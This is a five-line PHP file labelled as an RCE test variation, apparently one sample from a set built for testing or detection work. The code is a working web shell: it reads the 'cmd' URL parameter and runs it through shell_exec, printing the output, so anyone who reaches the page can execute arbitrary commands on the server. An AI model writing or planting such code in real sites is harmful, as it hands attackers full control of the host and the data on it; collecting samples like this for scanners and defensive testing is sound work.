<?php
// RCE test variation #941
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>